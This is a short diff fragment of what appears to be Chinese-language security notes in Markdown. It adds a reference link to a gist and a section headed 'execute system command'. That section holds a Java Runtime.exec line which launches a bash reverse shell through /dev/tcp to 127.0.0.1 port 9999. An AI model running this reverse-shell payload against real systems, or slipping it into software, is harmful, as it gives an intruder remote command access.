@@ -28,5 +28,14 @@
             s.close();
 ```
 
+
+
 参考：
 https://gist.github.com/caseydunham/53eb8503efad39b83633961f12441af0
+
+
+
+执行系统命令：
+```
+java.lang.Runtime.getRuntime().exec("/bin/bash -c $@|bash 0 echo bash -i >&/dev/tcp/127.0.0.1/9999 0>&1"
+```
